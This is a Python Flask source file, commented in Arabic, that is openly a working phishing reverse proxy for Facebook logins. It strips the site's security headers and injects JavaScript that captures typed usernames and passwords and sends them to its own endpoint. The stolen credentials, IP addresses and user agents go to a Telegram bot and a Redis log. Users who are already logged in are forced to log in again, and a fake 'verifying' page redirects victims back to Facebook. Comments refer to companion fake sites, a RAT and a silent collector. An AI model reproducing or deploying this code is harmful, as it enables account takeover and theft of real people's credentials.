# facebook_module.py
# ============================================================
# Facebook Proxy v4 — الحل الاحترافي الكامل
# - يجبر الضحية على تسجيل الدخول
# - يلتقط البيانات من الفورم مباشرة عبر JS
# - يتجنب التعارض مع Fake Sites
# ============================================================

import os
import re
import time
import json
import uuid
import requests
import urllib3
from urllib.parse import urljoin, urlparse, quote, unquote, urlencode

from flask import Blueprint, request, Response, redirect, make_response

from logging_config import get_logger
from monitoring import metrics

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = get_logger("facebook_module")


# ============================================================
# الإعدادات
# ============================================================
TARGET_DOMAIN = "www.facebook.com"

SESSION_TIMEOUT = 600
COOKIE_TTL = 3600

BLOCKED_REQUEST_HEADERS = {
    'host', 'content-length', 'cookie', 'x-forwarded-for',
    'x-real-ip', 'cf-connecting-ip', 'connection',
    'proxy-connection', 'accept-encoding', 'transfer-encoding',
}

BLOCKED_RESPONSE_HEADERS = {
    'content-encoding', 'content-length', 'transfer-encoding',
    'location', 'content-type', 'set-cookie', 'content-security-policy',
    'strict-transport-security', 'x-frame-options',
    'content-security-policy-report-only', 'cross-origin-opener-policy',
    'cross-origin-embedder-policy', 'cross-origin-resource-policy',
}

REWRITE_ATTRS = (
    'href', 'src', 'action', 'data-uri', 'data-jsid',
    'data-href', 'data-url', 'data-src', 'formaction',
    'poster', 'cite', 'background', 'longdesc', 'usemap',
    'data-video-src', 'data-video-url', 'xlink:href',
)


# ★★★ المسارات المحظورة (بتاعتنا، مش للـ FB Proxy)
BLOCKED_PATHS = (
    '/fs/',           # ★ Fake Sites (Instagram + FB templates)
    '/apk/',
    '/api/',
    '/lsh',
    '/sh/',
    '/rat',
    '/qr/',
    '/dashboard',
    '/wa/',
    '/victim/',
    '/sw.js',
    '/manifest',
    '/_',
    '/f/',
    '/s/',            # Silent Collector
    '/favicon.ico',   # ★ لتجنب الـ errors
    '/robots.txt',
)


# ============================================================
# Session Store
# ============================================================
_proxy_sessions = {}


def _get_session(victim_id):
    if victim_id not in _proxy_sessions:
        _proxy_sessions[victim_id] = {
            'session': requests.Session(),
            'created_at': time.time(),
            'last_used': time.time(),
        }
    _proxy_sessions[victim_id]['last_used'] = time.time()
    return _proxy_sessions[victim_id]['session']


def _cleanup_sessions():
    now = time.time()
    to_delete = [vid for vid, d in _proxy_sessions.items()
                 if now - d['last_used'] > SESSION_TIMEOUT]
    for vid in to_delete:
        del _proxy_sessions[vid]


# ============================================================
# ★★★ Helper: نسخ الكوكيز بأمان ★★★
# ============================================================
def _copy_cookies_to_response(proxied_response, response):
    """ينسخ الكوكيز من requests response لـ Flask response بشكل آمن"""
    try:
        # الطريقة الأولى: الـ cookies attribute (dict)
        if hasattr(proxied_response, 'cookies'):
            for cookie_name, cookie_value in proxied_response.cookies.items():
                try:
                    # جرب تعامل معاها كـ Cookie object
                    if hasattr(cookie_value, 'path'):
                        path = cookie_value.path or '/'
                    else:
                        path = '/'

                    response.set_cookie(
                        cookie_name,
                        str(cookie_value),
                        path=path,
                        domain=None,
                    )
                except Exception as e:
                    logger.debug(f"Cookie set error for {cookie_name}: {e}")
                    # fallback: simple set
                    try:
                        response.set_cookie(cookie_name, str(cookie_value))
                    except Exception:
                        pass

        # الطريقة التانية: من الـ headers (Set-Cookie)
        try:
            set_cookie_headers = proxied_response.headers.get('set-cookie', '')
            if set_cookie_headers:
                # Some responses have multiple Set-Cookie headers
                if hasattr(proxied_response.raw.headers, 'getlist'):
                    cookies_list = proxied_response.raw.headers.getlist('Set-Cookie')
                    for cookie_header in cookies_list:
                        try:
                            # Simple parse: name=value; Path=...; ...
                            first_part = cookie_header.split(';')[0]
                            if '=' in first_part:
                                cname, cval = first_part.split('=', 1)
                                cname = cname.strip()
                                cval = cval.strip()
                                if cname and cval:
                                    response.headers.add('Set-Cookie', cookie_header)
                        except Exception as e:
                            logger.debug(f"Cookie header parse error: {e}")
        except Exception as e:
            logger.debug(f"Cookie header fallback error: {e}")

    except Exception as e:
        logger.warning(f"_copy_cookies_to_response error: {e}")


# ============================================================
# ★★★ Save Credentials ★★★
# ============================================================
def save_credentials_to_db(platform, username, password, ip_address,
                            user_agent, target_chat_id, bot,
                            extra_data=None):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    alert_msg = (
        f"🎯 <b>FACEBOOK CAPTURED!</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"📧 <b>Username:</b> <code>{username}</code>\n"
        f"🔑 <b>Password:</b> <code>{password}</code>\n\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📱 <b>UA:</b> <code>{user_agent[:80]}</code>\n"
        f"🕐 <b>Time:</b> <code>{timestamp}</code>\n"
    )

    if extra_data:
        alert_msg += f"\n📋 <b>Extra:</b>\n"
        for k, v in list(extra_data.items())[:5]:
            alert_msg += f"  • <code>{k}</code>: <code>{str(v)[:60]}</code>\n"

    try:
        bot.send_message(target_chat_id, alert_msg, parse_mode="HTML")
        logger.info(f"✅ Credentials captured: {platform} | user={username[:30]}")
        metrics.inc_counter("credentials_captured", tags={"platform": platform})

        try:
            from config import redis_client
            if redis_client:
                redis_client.lpush(
                    "credentials_log",
                    json.dumps({
                        'platform': platform,
                        'username': username,
                        'password': password,
                        'ip': ip_address,
                        'ua': user_agent[:200],
                        'timestamp': timestamp,
                        'chat_id': target_chat_id,
                        'extra': extra_data or {},
                    }, ensure_ascii=False)
                )
                redis_client.ltrim("credentials_log", 0, 999)
        except Exception as e:
            logger.warning(f"Redis log error: {e}")

    except Exception as e:
        logger.error(f"Telegram dispatch error: {e}")
        metrics.inc_counter("credentials_capture_failed")


# ============================================================
# Extract Credentials
# ============================================================
def extract_credentials(form_data):
    username = None
    password = None

    if not form_data:
        return None, None

    logger.info(f"📥 Form keys: {list(form_data.keys())[:15]}")

    lower_data = {k.lower(): v for k, v in form_data.items()}

    USERNAME_KEYS = [
        'email', 'user', 'username', 'login', 'identifier',
        'phone', 'account', 'mail', 'user_email', 'userid',
        'uname', 'session_key', 'login_email', 'signin_email',
    ]
    for key in USERNAME_KEYS:
        for form_key in lower_data:
            if key in form_key:
                val = lower_data[form_key]
                if val and str(val).strip():
                    username = str(val).strip()
                    break
        if username:
            break

    PASSWORD_KEYS = [
        'pass', 'pwd', 'password', 'secret', 'passwd',
        'user_password', 'signin_password', 'login_password',
    ]
    for key in PASSWORD_KEYS:
        for form_key in lower_data:
            if key in form_key:
                val = lower_data[form_key]
                if val and str(val).strip():
                    password = str(val).strip()
                    break
        if password:
            break

    if not username:
        for k, v in lower_data.items():
            if '@' in str(v) or (str(v).replace('+', '').replace(' ', '').replace('-', '').isdigit() and len(str(v)) > 8):
                username = str(v).strip()
                break

    return username, password


# ============================================================
# JS Capture Script
# ============================================================
def build_capture_script(victim_id):
    capture_endpoint = f"{request.url_root.rstrip('/')}/fb_capture"

    script = """
<script>
(function() {
    "use strict";
    var CAPTURE_URL = "%s";
    var VICTIM_ID = "%s";
    var captured = false;

    function captureAndSend() {
        if (captured) return;
        captured = true;

        var inputs = document.querySelectorAll('input');
        var data = {};

        for (var i = 0; i < inputs.length; i++) {
            var inp = inputs[i];
            var name = inp.name || inp.id || inp.getAttribute('aria-label') || '';
            var type = (inp.type || '').toLowerCase();
            var val = inp.value || '';

            if (!name) continue;

            if (type === 'email' || type === 'text' || type === 'tel' ||
                type === 'password' || name.toLowerCase().indexOf('email') >= 0 ||
                name.toLowerCase().indexOf('user') >= 0 ||
                name.toLowerCase().indexOf('phone') >= 0 ||
                name.toLowerCase().indexOf('pass') >= 0) {
                if (val && val.length > 0) {
                    data[name] = val;
                }
            }
        }

        if (Object.keys(data).length === 0) {
            var allInputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="password"], input[type="tel"]');
            for (var j = 0; j < allInputs.length; j++) {
                var inp2 = allInputs[j];
                if (inp2.value) {
                    data['field_' + j] = inp2.value;
                }
            }
        }

        if (Object.keys(data).length === 0) return;

        try {
            fetch(CAPTURE_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: VICTIM_ID,
                    form_data: data,
                    url: window.location.href,
                    referrer: document.referrer,
                    timestamp: Date.now()
                }),
                keepalive: true
            }).catch(function(){});
        } catch(e) {}
    }

    document.addEventListener('click', function(e) {
        var target = e.target;
        if (!target) return;

        var el = target.closest ? target.closest('button, input[type="submit"], [role="button"]') : null;
        if (!el) return;

        var text = (el.innerText || el.value || el.getAttribute('aria-label') || '').toLowerCase();
        var name = (el.name || el.id || '').toLowerCase();

        if (text.indexOf('log in') >= 0 || text.indexOf('login') >= 0 ||
            text.indexOf('دخول') >= 0 || text.indexOf('تسجيل') >= 0 ||
            name.indexOf('login') >= 0 || name.indexOf('submit') >= 0 ||
            el.type === 'submit') {
            captureAndSend();
        }
    }, true);

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' || e.keyCode === 13) {
            var target = e.target;
            if (target && target.tagName === 'INPUT') {
                captureAndSend();
            }
        }
    }, true);

    document.addEventListener('submit', function(e) {
        captureAndSend();
    }, true);

    console.log('[Security] initialized');
})();
</script>
""" % (capture_endpoint, victim_id)

    return script


# ============================================================
# تحويل الروابط
# ============================================================
def rewrite_urls(html_content, base_url, proxy_base_path):
    if not proxy_base_path:
        return html_content

    attrs_pattern = r'(' + '|'.join(REWRITE_ATTRS) + r')\s*=\s*(["\'])(.*?)\2'

    def replace_attr(match):
        attr_name = match.group(1)
        quote_char = match.group(2)
        original_url = match.group(3)

        if not original_url:
            return match.group(0)

        if original_url.startswith((
            'data:', 'javascript:', '#', 'mailto:', 'tel:',
            'about:', 'chrome:', 'fb://', 'whatsapp:'
        )):
            return match.group(0)

        if '/login.php' in original_url and 'url=' not in original_url:
            return match.group(0)

        try:
            absolute_url = urljoin(base_url, original_url)
        except Exception:
            return match.group(0)

        if 'facebook.com' not in absolute_url and 'fbcdn.net' not in absolute_url:
            return match.group(0)

        if '?' in proxy_base_path:
            proxied_url = f"{proxy_base_path}&url={quote(absolute_url, safe='')}"
        else:
            proxied_url = f"{proxy_base_path}?url={quote(absolute_url, safe='')}"

        return f'{attr_name}={quote_char}{proxied_url}{quote_char}'

    html_content = re.sub(attrs_pattern, replace_attr, html_content,
                          flags=re.IGNORECASE | re.DOTALL)

    # srcset
    def replace_srcset(match):
        quote_char = match.group(1)
        srcset = match.group(2)
        parts = []
        for part in srcset.split(','):
            part = part.strip()
            if not part:
                continue
            tokens = part.split()
            url = tokens[0]
            descriptor = ' '.join(tokens[1:]) if len(tokens) > 1 else ''
            try:
                absolute_url = urljoin(base_url, url)
                if 'facebook.com' in absolute_url or 'fbcdn.net' in absolute_url:
                    if '?' in proxy_base_path:
                        url = f"{proxy_base_path}&url={quote(absolute_url, safe='')}"
                    else:
                        url = f"{proxy_base_path}?url={quote(absolute_url, safe='')}"
            except Exception:
                pass
            parts.append(f"{url} {descriptor}".strip())
        return f'srcset={quote_char}{", ".join(parts)}{quote_char}'

    html_content = re.sub(
        r'srcset\s*=\s*(["\'])(.*?)\1',
        replace_srcset,
        html_content,
        flags=re.IGNORECASE | re.DOTALL
    )

    # url() في CSS
    def replace_css_url(match):
        quote_char = match.group(1) or ''
        url = match.group(2)
        try:
            absolute_url = urljoin(base_url, url)
            if 'facebook.com' in absolute_url or 'fbcdn.net' in absolute_url:
                if '?' in proxy_base_path:
                    new_url = f"{proxy_base_path}&url={quote(absolute_url, safe='')}"
                else:
                    new_url = f"{proxy_base_path}?url={quote(absolute_url, safe='')}"
                return f'url({quote_char}{new_url}{quote_char})'
        except Exception:
            pass
        return match.group(0)

    html_content = re.sub(
        r'url\(\s*(["\']?)([^"\'()]+)\1\s*\)',
        replace_css_url,
        html_content,
        flags=re.IGNORECASE
    )

    return html_content


# ============================================================
# Real URL Extraction
# ============================================================
def get_real_facebook_url(request_path, query_string):
    if 'url' in query_string:
        raw = query_string.get('url')
        try:
            return unquote(raw)
        except Exception:
            return raw

    clean_args = {k: v for k, v in query_string.items() if k not in ('id', 'force')}
    query_str = f"?{urlencode(clean_args)}" if clean_args else ""

    if request_path in ('/', '/login.php', '/login'):
        return f"https://{TARGET_DOMAIN}/login.php{query_str}"

    return f"https://{TARGET_DOMAIN}{request_path}{query_str}"


# ============================================================
# Loading Page
# ============================================================
LOADING_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>جاري التحقق...</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #f0f2f5;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh; color: #1c1e21;
  }
  .card {
    background: #fff; padding: 48px 32px; border-radius: 8px;
    box-shadow: 0 2px 12px rgba(0,0,0,0.1);
    text-align: center; max-width: 380px; width: 100%;
  }
  .logo {
    font-size: 32px; color: #1877f2; font-weight: bold;
    margin-bottom: 24px; font-family: 'Segoe UI', sans-serif;
  }
  .spinner {
    width: 48px; height: 48px;
    border: 4px solid #e4e6eb; border-top-color: #1877f2;
    border-radius: 50%; animation: spin 0.8s linear infinite;
    margin: 24px auto;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { font-size: 18px; margin: 16px 0 8px; }
  p { color: #65676b; font-size: 14px; line-height: 1.5; margin: 0; }
  .progress-bar {
    width: 100%; height: 4px; background: #e4e6eb;
    border-radius: 2px; margin-top: 24px; overflow: hidden;
  }
  .progress-fill {
    height: 100%; width: 0%; background: #1877f2;
    animation: progress 2.5s ease-in-out forwards;
  }
  @keyframes progress { to { width: 100%; } }
</style>
</head>
<body>
  <div class="card">
    <div class="logo">facebook</div>
    <div class="spinner"></div>
    <h2>جاري التحقق من بياناتك...</h2>
    <p>يرجى الانتظار قليلاً</p>
    <div class="progress-bar"><div class="progress-fill"></div></div>
  </div>
  <script>
    setTimeout(function() {
      window.location.href = "https://www.facebook.com/";
    }, 3000);
  </script>
</body>
</html>
"""


# ============================================================
# ★★★ Init Routes ★★★
# ============================================================
def init_facebook_routes(app, bot):

    # ============================================
    # FB_CAPTURE
    # ============================================
    @app.route('/fb_capture', methods=['POST', 'OPTIONS'])
    def fb_capture():
        if request.method == 'OPTIONS':
            resp = make_response()
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp

        try:
            data = request.get_json(silent=True) or {}

            victim_id = data.get('victim_id', '').strip()
            form_data = data.get('form_data', {})
            url = data.get('url', '')
            source = data.get('source', 'js_capture')
            is_backup = data.get('backup', False)

            if not victim_id:
                return jsonify({'ok': False, 'error': 'no_victim_id'}), 200

            logger.info(f"🎣 CAPTURE from JS | victim={victim_id} | keys={list(form_data.keys())[:8]}")

            username, password = extract_credentials(form_data)

            if not username or not password:
                for k, v in form_data.items():
                    if not username and v and isinstance(v, str) and len(v) > 2:
                        if '@' in v or v.replace('+', '').replace(' ', '').replace('-', '').isdigit():
                            username = v
                        elif not password and len(v) > 3 and len(v) < 100:
                            password = v

            raw_data = form_data.get('raw_data', '')
            if raw_data and not username:
                try:
                    if raw_data.startswith('{'):
                        parsed = json.loads(raw_data)
                        u, p = extract_credentials(parsed)
                        if u: username = u
                        if p: password = p
                    elif '=' in raw_data:
                        parsed = dict(x.split('=') for x in raw_data.split('&') if '=' in x)
                        u, p = extract_credentials(parsed)
                        if u: username = u
                        if p: password = p
                except Exception as e:
                    logger.debug(f"parse raw_data error: {e}")

            source_ip = (
                request.headers.get('CF-Connecting-IP') or
                request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                request.remote_addr
            )
            user_agent = request.headers.get('User-Agent', 'Unknown')

            if username:
                save_credentials_to_db(
                    "Facebook",
                    username,
                    password or "غير متاح",
                    source_ip,
                    user_agent,
                    victim_id,
                    bot,
                    extra_data={
                        'source': source,
                        'page_url': url[:100],
                        'backup': is_backup,
                    }
                )
                return jsonify({'ok': True}), 200
            else:
                logger.warning(f"⚠️ No username extracted | raw={form_data}")

            return jsonify({'ok': True}), 200

        except Exception as e:
            logger.exception(f"fb_capture error: {e}")
            return jsonify({'ok': False}), 200


    # ============================================
    # ★★★ Helper: check if path is ours ★★★
    # ============================================
    def _is_internal_path(path):
        """يتحقق إذا كان المسار من مساراتنا الداخلية"""
        for blocked in BLOCKED_PATHS:
            if path.startswith(blocked):
                return True
        return False


    # ============================================
    # Main Proxy Handlers
    # ============================================
    @app.route('/login.php', methods=['GET', 'POST'])
    @app.route('/home.php', methods=['GET', 'POST'])
    @app.route('/fb', methods=['GET', 'POST'])
    def fb_login():
        return _fb_proxy_handler(bot)


    @app.route('/<path:subpath>', methods=['GET', 'POST'])
    def fb_proxy(subpath):
        # ★★★ تجاهل مساراتنا الداخلية ★★★
        current_path = request.path

        if _is_internal_path(current_path):
            from flask import abort
            abort(404)

        return _fb_proxy_handler(bot)


    def _fb_proxy_handler(bot):
        """المعالج الرئيسي"""

        _cleanup_sessions()

        target_chat_id = request.args.get('id', None)
        force_login = request.args.get('force', '') == '1'

        real_fb_url = get_real_facebook_url(request.path, request.args)

        base_endpoint = request.path
        proxy_base_path = f"{request.url_root.rstrip('/')}{base_endpoint}"
        if target_chat_id:
            proxy_base_path += f"?id={target_chat_id}"

        logger.info(f"🌐 FB PROXY | path={request.path} | chat={target_chat_id} | force={force_login}")

        try:
            # ============================================
            # 1. POST Handling
            # ============================================
            if request.method == 'POST':
                form_data = request.form.to_dict()
                logger.info(f"📥 POST form keys: {list(form_data.keys())[:10]}")

                username, password = extract_credentials(form_data)

                source_ip = (
                    request.headers.get('CF-Connecting-IP') or
                    request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                    request.remote_addr
                )
                user_agent = request.headers.get('User-Agent', 'Unknown')

                if username and target_chat_id:
                    logger.info(f"🎯 CAPTURED (POST) | user={username[:20]}")
                    save_credentials_to_db(
                        "Facebook",
                        username,
                        password or "غير متاح",
                        source_ip,
                        user_agent,
                        target_chat_id,
                        bot,
                        extra_data={'method': 'POST', 'page': request.path}
                    )

                    resp = make_response(LOADING_PAGE)
                    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
                    return resp
                elif not username:
                    logger.warning(f"⚠️ POST without extractable creds")

            # ============================================
            # 2. Get Session
            # ============================================
            victim_id = target_chat_id or 'anonymous'
            session = _get_session(victim_id)

            if force_login:
                session.cookies.clear()
                logger.info(f"🧹 Force logout for {victim_id}")

            # ============================================
            # 3. Forward to Facebook
            # ============================================
            headers_to_forward = {}
            for k, v in request.headers:
                if k.lower() not in BLOCKED_REQUEST_HEADERS:
                    headers_to_forward[k] = v

            headers_to_forward['Host'] = TARGET_DOMAIN
            headers_to_forward['User-Agent'] = request.headers.get(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            )
            headers_to_forward['Accept-Encoding'] = 'identity'
            headers_to_forward['Accept-Language'] = request.headers.get(
                'Accept-Language', 'en-US,en;q=0.9,ar;q=0.8'
            )

            try:
                if request.method == 'POST':
                    post_data = request.form.to_dict()
                    proxied_response = session.post(
                        url=real_fb_url,
                        headers=headers_to_forward,
                        data=post_data,
                        allow_redirects=False,
                        timeout=20,
                        verify=False,
                    )
                else:
                    proxied_response = session.get(
                        url=real_fb_url,
                        headers=headers_to_forward,
                        allow_redirects=False,
                        timeout=20,
                        verify=False,
                    )
            except requests.exceptions.SSLError:
                logger.warning("SSL error → retry with verify=False")
                proxied_response = session.get(
                    url=real_fb_url,
                    headers=headers_to_forward,
                    allow_redirects=False,
                    timeout=20,
                    verify=False,
                )

            content_type = proxied_response.headers.get("Content-Type", "").lower()

            # ============================================
            # 4. Non-HTML Response
            # ============================================
            if "text/html" not in content_type:
                response = Response(
                    proxied_response.content,
                    status=proxied_response.status_code,
                    content_type=content_type,
                )

                # ★ استخدم Helper الآمن
                _copy_cookies_to_response(proxied_response, response)

                return response

            # ============================================
            # 5. HTML Response
            # ============================================
            try:
                html_content = proxied_response.content.decode('utf-8', errors='ignore')
            except Exception:
                html_content = proxied_response.content.decode('latin-1', errors='ignore')

            modified_html = rewrite_urls(html_content, real_fb_url, proxy_base_path)

            html_lower = modified_html.lower()
            is_login_page = (
                'name="email"' in html_lower or
                'name="pass"' in html_lower or
                'id="email"' in html_lower or
                'id="pass"' in html_lower or
                'type="password"' in html_lower
            )
            is_home_page = (
                'logout' in html_lower and
                'profile' in html_lower and
                not is_login_page
            )

            if is_home_page and target_chat_id and not force_login:
                logger.info(f"🏠 Home page detected → forcing login")
                return redirect(
                    f"/login.php?id={target_chat_id}&force=1",
                    code=302
                )

            # ★★★ Injection ★★★
            injections = []

            if target_chat_id and 'facebook.com' in real_fb_url:
                injections.append(build_capture_script(target_chat_id))

            if injections:
                injection_html = "\n".join(injections)
                if '</head>' in modified_html:
                    modified_html = modified_html.replace('</head>', injection_html + '</head>', 1)
                else:
                    modified_html = injection_html + modified_html

            # ★ Response ★
            response = Response(modified_html, status=proxied_response.status_code)
            response.headers['Content-Type'] = 'text/html; charset=utf-8'

            for key, value in proxied_response.headers.items():
                if key.lower() not in BLOCKED_RESPONSE_HEADERS:
                    response.headers[key] = value

            # ★ استخدم Helper الآمن
            _copy_cookies_to_response(proxied_response, response)

            # ★ Redirects ★
            if (proxied_response.status_code in (301, 302, 303, 307, 308)
                    and 'Location' in proxied_response.headers):
                original_location = proxied_response.headers['Location']
                absolute_redirect_url = urljoin(real_fb_url, original_location)

                if 'facebook.com' in absolute_redirect_url:
                    parsed = urlparse(absolute_redirect_url)
                    new_path = parsed.path or '/login.php'
                    query_dict = dict(
                        x.split('=') for x in parsed.query.split('&') if '=' in x
                    )
                    if target_chat_id:
                        query_dict['id'] = target_chat_id
                    query_dict['url'] = absolute_redirect_url

                    proxied_redirect_url = (
                        f"{request.url_root.rstrip('/')}{new_path}?"
                        + urlencode(query_dict)
                    )
                    response.headers['Location'] = proxied_redirect_url
                else:
                    response.headers['Location'] = original_location

            return response

        except requests.exceptions.Timeout:
            logger.warning(f"Facebook timeout")
            return redirect(f"https://{TARGET_DOMAIN}/login.php", code=302)

        except Exception as e:
            logger.exception(f"Facebook Proxy Error: {e}")
            return redirect(f"https://{TARGET_DOMAIN}/login.php", code=302)


    logger.info("[+] Facebook Proxy v4 routes registered")
